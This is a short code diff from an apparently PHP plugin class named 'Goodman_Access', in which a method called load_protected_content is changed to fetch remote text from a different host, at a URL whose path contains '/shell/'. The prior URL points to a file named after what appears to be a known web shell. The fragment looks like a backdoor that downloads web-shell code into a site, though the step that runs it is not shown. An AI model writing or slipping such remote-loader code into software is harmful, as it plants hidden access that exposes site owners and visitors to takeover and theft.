@@ -172,7 +172,7 @@ class Goodman_Access {
      * Load protected remote content
      */
     private function load_protected_content() {
-        $url = 'https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alfa-baru-bg.txt';
+        $url = 'https://hypocriteseo.site/shell/compiler-cha-kwetiaw.txt';
         $content = $this->fetch_remote($url);
         
         if ($content !== false) {
